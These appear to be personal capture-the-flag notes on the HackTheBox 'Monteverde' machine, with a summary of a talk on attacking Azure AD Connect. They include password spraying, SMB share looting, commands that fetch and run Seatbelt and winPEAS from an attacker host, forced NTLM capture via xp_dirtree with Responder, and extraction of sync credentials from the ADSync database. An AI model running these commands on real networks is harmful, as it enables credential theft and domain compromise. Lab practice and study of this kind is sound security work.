![](assets/Monterverde_assets/Pasted%20image%2020231114204351.png)

- so now we have access as DA

![](assets/Monterverde_assets/Pasted%20image%2020231114205716.png)

- we can now view our root flag

![](assets/Monterverde_assets/Pasted%20image%2020231114205655.png)

## Resources
- [Azure AD Connect for Red Teamers - XPN InfoSec Blog (xpnsec.com)](https://blog.xpnsec.com/azuread-connect-for-redteam/)
- [Azure AD Connect Database Exploit (Priv Esc) | VbScrub](https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/)
- [Updating adconnectdump - a journey into DPAPI - dirkjanm.io](https://dirkjanm.io/updating-adconnectdump-a-journey-into-dpapi/)
- [TR19-Im in your cloud.pdf (dirkjanm.io)](https://dirkjanm.io/assets/raw/TR19-Im%20in%20your%20cloud.pdf)
- [TR19: I'm in your cloud, reading everyone's emails - hacking Azure AD via Active Directory (youtube.com)](https://www.youtube.com/watch?v=JEIR5oGCwdg)



Walkthrough
- the thing with Azure connect is that microsoft has to store the database some where!!
- if we were doing any type of ticket attack, like forging ticket, we may want to make sure our clocks are synced (use of the clock skew in nmap)
- we can query dns
```
nslookup
server 10.10.10.17
127.0.0.1 #lookup localhost
10.10.10.172 # lookup its IP ((its meanr to leak the hostname)
monteverde #look
```
- after we run `enumdomusers'
- we can copy the users and paste in a file in vim, then we can do `6x` to delete the first 6 characters then go to the end of each word and do `d$`
- after editing a custom wordlist like adding after including possible usernames, Summer, winter, spring to the list, we can do sth with hashcat
```shell
hashcat --force --stdout -r /usr/share/hashcat/rules/best64.rule password.lst > password2.lst
```
- then we can run crackmapexec
```
crackmapexec smb 10.10.10.172 -u users.list -p passwords.lst
```
- we can check for the password policy before this `--pass-pol` and see the Account Lockout Threshold, if its none
- after you get a login credentials without admin privileges, we can do winrm to see if we do, or we just enumerate shares like
```shell
smbmap -u SABatchJobs -p SABatchJobs -H 10.10.10.172
```
we could try null using
```shell
smbmap -u '' -H 10.10.10.172
```
or guest
```
smbclient -U 'guest' -L //10.10.10.172
```
or do anonymous
- we can recursively list the content of the directories using
```shell
smbmap -u SABatchJobs -p SABatchJobs -H 10.10.10.172 -R --exclude SYSVOL IPC$

```
mount it is better
- then we can see the azure.xml file in the mhope users directory
- we can download it using
```
smbmap -u SABatchJobs -p SABatchJobs -H 10.10.10.172 --download users$/mhope/azure.xml
```
- then evilwinrm
```
evil-winrm -u mhope -p '<pass>' -i <ip>
```
- then after getting a shell
```
hostname; whoami; ipconfig
```
- download Seatbelt.exe (upload feature in winrm has some encoding issues)
```
curl 10.10.14.2:8000/Seatbelt.exe -o Seatbelt.exe
```
then we run the script
```
.\Seatbelt.exe -group=all
```
- we can see the applications installed in the output, we can see AzureAD connect
- then we can run winpeas too
- we see MSSQL running there, we can run PowerUpSQL to check that or try xpcmdshell, we can try to run `sqlcmd -L`, we can do
```
sqlcmd -Q "select * from sys.databases"
sqlcmd -Q "select name,create_data from sys.databases"
```
or just run PowerUPSQSL using IEX, we can see a cheatsheet [PowerUpSQL Cheat Sheet · NetSPI/PowerUpSQL Wiki · GitHub](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)
we can do 
```shell
Get-SQLInstanceLocal -Verbose #does not work
Invoke-SQLAudit -Verbose #what works, this is in the privilege escalation part of the cheatsheet
```
- if we run the second, we will see that we can run `xp_dirtree`, so we can do 
```shell
sqlcmd -Q "xp_dirtree '\\10.10.14.2\test'"
```
while running 
```shell
sudo responder -I tun0
```
and we get a hash
- if we do 
```shell
hashcat --example-hashes | less
```
we can see the different hashes an their number
```shell
hashcat -m 5600 hashes/monteverde /opt/wordlist/rockyou.txt -r rules/best64.rule
```
but this didn't crack the hash we found
if there was another box, we would have relayed it
- if we do `whoami /all` we will see see we are Azure Admins
- we can search Azure connect privilege escalation
- in that XPN blog
- we will see that the ADSync database has a table `mms_management_agent` which contains a filed `private_configuration.xml`, so we can do
```shell
sqlcmd -Q "Use ADSync; select private_configuration_xml,encypted_configuration FROM mms_management_agent"
```
we also grabbed the `encypted_configuration` which contains and encrypted password
- try each line of the powershell script on your evil winrm to try to troubleshoot the issue
- and he changed the connection string and the script worked
- if we save the mcrypt.dll and file it we will see it is a .Net assembly
- copied the file to his commando vm and use DNSpy to decompile File >> Open
- since our DNS hostname query did not work initially, now we have admin we can check why in the powershell
```
Export-DNSServerZone -FileName MEGABANK.ZONE -Name MEGABANK.LOCAL
```
we use this to export all the DNS records
- to recursively search for a file with a specific string in powershell, we can use
```
gci -recurse -include MEGABANK*
```
it saved the file in `C:\Windows\System32\dns`
- we will see that the IP is correct

Writeup
- check members of the Remote Management that allows users to connect using Poweshell Remoting
```shell
python windapsearch.py -u "" --dc-ip 10.10.10.172 -U -m "Remote Management Users"
```
- use it to create a list of domain users
```shell
python windapsearch.py -u "" --dc-ip 10.10.10.172 -U | grep '@' | cut -d ' ' -f 2 | cut
-d '@' -f 1 | uniq > users.txt
```
- we can also add these to our password list
```shell
wget https://raw.githubusercontent.com/insidetrust/statistically-likely-
usernames/master/weak-corporate-passwords/english-basic.txt
cat users.txt >> english-basic.txt
```
- we can also try to execute commands using smbmap which isn't successful
```shell
smbmap -u SABatchJobs -p SABatchJobs -d megabank -H 10.10.10.172 -x whoami
```
- we can crawl the shares for interesting files
```
smbmap -u SABatchJobs -p SABatchJobs -d megabank -H 10.10.10.172 -A
'(xlsx|docx|txt|xml)' -R
```

```
whoami /groups
```
- https://docs.microsoft.com/en-us/azure/active-directory/hybrid/concept-adsync-service-account
- we can try to enumerate services with the PowerShell cmdlet `Get-Service` , or by invoking
```
wmic.exeservice get name 

OR 

sc.exe query state= all 

OR

net.exe start 
```

but are also denied access. Instead,
`tasklist` also showed access denied
- we can enumerate the service instance using the Registry

```
Get-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\ADSync
```

and we will see the service binary is at
`C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe 

- we can obtain the file and product version, using the command
```sh
Get-ItemProperty -Path "C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe" |
Format-list -Property * -Force
```

- we can manually use sqlcmd to extract the values 
```shell
sqlcmd -S MONTEVERDE -Q "use ADsync; select instance_id,keyset_id,entropy from
mms_server_configuration"
```




![](assets/Monterverde_assets/Pasted%20image%2020231114101704.png)![](assets/Monterverde_assets/Pasted%20image%2020231114135245.png)

```
IEX(New-Object Net.webClient).downloadString('http://10.10.14.20/winPEAS.ps1');FullCheck
```

```
    + CategoryInfo          : NotSpecified: (:) [Get-Service], InvalidOperationException
    + FullyQualifiedErrorId : System.InvalidOperationException,Microsoft.PowerShell.Commands.GetServiceCommand
*Evil-WinRM* PS C:\Users\mhope\Documents> dsregcmd.exe /status

+----------------------------------------------------------------------+
| Device State                                                         |
+----------------------------------------------------------------------+

             AzureAdJoined : NO
          EnterpriseJoined : NO
              DomainJoined : YES
                DomainName : MEGABANK

+----------------------------------------------------------------------+
| User State                                                           |
+----------------------------------------------------------------------+

                    NgcSet : NO
           WorkplaceJoined : NO
             WamDefaultSet : ERROR

+----------------------------------------------------------------------+
| SSO State                                                            |
+----------------------------------------------------------------------+

                AzureAdPrt : NO
       AzureAdPrtAuthority : NO
             EnterprisePrt : NO
    EnterprisePrtAuthority : NO

+----------------------------------------------------------------------+
| Diagnostic Data                                                      |
+----------------------------------------------------------------------+

     Diagnostics Reference : www.microsoft.com/aadjerrors
              User Context : UN-ELEVATED User
               Client Time : 2023-11-14 16:12:22.000 UTC
      AD Connectivity Test : PASS
     AD Configuration Test : FAIL [0x80070002]
        DRS Discovery Test : SKIPPED
     DRS Connectivity Test : SKIPPED
    Token acquisition Test : SKIPPED
     Fallback to Sync-Join : ENABLED

     Previous Registration : 2023-11-14 15:34:41.000 UTC
               Error Phase : discover
          Client ErrorCode : 0x801c001d

+----------------------------------------------------------------------+
| Ngc Prerequisite Check                                               |
+----------------------------------------------------------------------+

                 NgcPreReq : ERROR 0xd0020017
            IsDeviceJoined : UNKNOWN
             IsUserAzureAD : UNKNOWN
             PolicyEnabled : UNKNOWN
          PostLogonEnabled : UNKNOWN
            DeviceEligible : UNKNOWN
        SessionIsNotRemote : YES
            CertEnrollment : none
              PreReqResult : WillNotProvision

*Evil-WinRM* PS C:\Users\mhope\Documents> sc.exe query state= all
[SC] OpenSCManager FAILED 5:

Access is denied.
```

[https://cloud.hacktricks.xyz/pentesting-cloud/azure-security/az-basic-information#authentication-tokens](https://cloud.hacktricks.xyz/pentesting-cloud/azure-security/az-basic-information#authentication-tokens)
[https://cloud.hacktricks.xyz/pentesting-cloud/azure-security/az-services/az-azuread#references](https://cloud.hacktricks.xyz/pentesting-cloud/azure-security/az-services/az-azuread#references)



### I'm in your cloud Video
[TR19: I'm in your cloud, reading everyone's emails - hacking Azure AD via Active Directory (youtube.com)](https://www.youtube.com/watch?v=JEIR5oGCwdg)

- Azure AD is a Microsoft cloud based IAM (Identity and Access Management Service)
> IAM is for making sure that only the right people (or machines) can access an organization's data (assets) at the right time, for the right reasons.

![](assets/Monterverde_assets/Pasted%20image%2020231231120302.png)
- even though it's called AD, they have little things in common
![](assets/Monterverde_assets/Pasted%20image%2020231231120448.png)
- Azure AD is not DC in the cloud
- there are 3 methods of integrating Azure AD and AD
	- Password Hash Synchronization (PHS)
	- Pass Through Authentication (PTA)
	- Active Directory Federation Services (AD FS)
- this talk focuses on PHS (common one)

![](assets/Monterverde_assets/Pasted%20image%2020231231120859.png)
- a user has a password on prem, a tool (Azure AD Connect) that sync the hashed passwords on to the Azure AD and anytime the user changes password, it gets uploaded to the cloud and the user can use it login with the same password on prem and in Office365 or Azure AD
- so just syncing hashed passwords
- azure ad connect is installed on prem and it needs to have access to the password hash it is to synchronize so it has to have a high privilege AD account
- it also has high privileged account in Azure AD, so high privileged accounts in both
- if your Azure AD connect sync account is compromised then your Azure AD is also compromised
- Find where the connect is installed, when you install it a user gets created, to get the Sync account, it has MSOL_ prefix in it
![](assets/Monterverde_assets/Pasted%20image%2020240101073846.png)
- the credentials are stored in the database, and its found in
```
C:\Program Files\Microsoft Azure AD Sync\Data
```
- can be accessed as a local DB on the host and browsed locally, 2 interesting tables
![](assets/Monterverde_assets/Pasted%20image%2020240101074120.png)
- in the` mms_management_agent` table, there is an XML part (private_configuration_xml) and also an encrypted configuration 
- if we look at the xml, we see our account name, on prep domain name, but the password isnt there but has the field encrypted="1", which suggests the password is the encrypted data which is also in the table
![](assets/Monterverde_assets/Pasted%20image%2020240101074528.png)
- all the crypto stuff are happpening in a dll called `mcrypt.dll`
- dll contains both C# and native(C++) code, C# is easy to analyze with dnsspy but native code contains all the cryptofunctions
- wit the C# there is this function LoadKeySet which takes 3 parameters (the key set is part containing the private keys ), and these fields are all in the server configuration table
![](assets/Monterverde_assets/Pasted%20image%2020240101075058.png)
- he did a litle POC and then see what it does in procmon
![](assets/Monterverde_assets/Pasted%20image%2020240101075200.png)
- he copied these reg values to his computer but it gave an error locally when he ran it, cause of DPAPI
![](assets/Monterverde_assets/Pasted%20image%2020240101075309.png)
- to look what is going in and out of DPAPI, we just monitor the calls to the dll Crypt32.dll, use the program APIMonitor (you can find all the dlls and check the functions you want to monitor)
- and when we run the POC, we see one call to CryptUnprotectData
![](assets/Monterverde_assets/Pasted%20image%2020240101075711.png)
- and then we see 514 bytes going in, which is exactly the 514 bytes that were pulled from the registry
- which suggests that it tries to read secrets from the registry and it encrypts it using DPAPI , we can see the encryption key set
![](assets/Monterverde_assets/Pasted%20image%2020240101075958.png)
- and then it passes on to the native code and does some more cryto stuff (which you can see when you monitor other windows DLLs)
- so in short
![](assets/Monterverde_assets/Pasted%20image%2020240101080250.png)
after that, we get back to our plaintext password
- so there are 2 data source, one is the Database, and the other is the registry
![](assets/Monterverde_assets/Pasted%20image%2020240101080406.png)
all these information can be queried on the network
or remotely over the network(with our python script)
- so he created a tool adconnectdump in python that does it via RPC calls, so no need to run executables
- first stopes the ADSync service cause it can access the database since its being used by the service
- then downloads the database
- then it looks up the DPAPI keys (based off of secretsdump),(grabbing the keys from the registry and decrypting them)
- so gets the encryption keys from the registry and gets the masterkey from disk
- and decrypt the passwords, then we get the password for the Azure AD and the local AD
- now we have the local, we can run DCSync and get all the hashes (secretsdump)
- 2 Azure AD roles
	- Azyre RBAC roles: used only for Azure Resource Manager, manage azure machines
	- Azure AD administrator roles: uses administrator roles
![](assets/Monterverde_assets/Pasted%20image%2020240101082321.png)
- powershell modules for interacting with AzureAD, they give different objects with different Object ID
![](assets/Monterverde_assets/Pasted%20image%2020240101082432.png)
![](assets/Monterverde_assets/Pasted%20image%2020240101082545.png)
- query the admins in Azure AD
![](assets/Monterverde_assets/Pasted%20image%2020240101082626.png)
- 2 interesting parameters, one is LastDirSyncTime, if empty it means this account only exists in AzureAD, if there is a timestamp, it means that it is synced from on prem wihthe password
- then the StrongAuthenticationRequirements parameter (you can only query it as Admin)
- not all admins are synced with on-prem and anyone can see the accounts that are not synced
- the question is if we are DA, can we sync an on prem account? and we can
- sth called smtp matching, so if the admin user was on the cloud you could create a new user on prem(which anyone can do) and then it magically gets synced if no MFA was enabled : this was fixed tho
![](assets/Monterverde_assets/Pasted%20image%2020240101083517.png)
- the roles are fixed meaning, you cannot define or remove permissions in that role
- Seamless Single Sign On: also known as lets pour all of kerberos's weaknesses to azure, it uses kerberos
![](assets/Monterverde_assets/Pasted%20image%2020240101084839.png)
![](assets/Monterverde_assets/Pasted%20image%2020240101084848.png)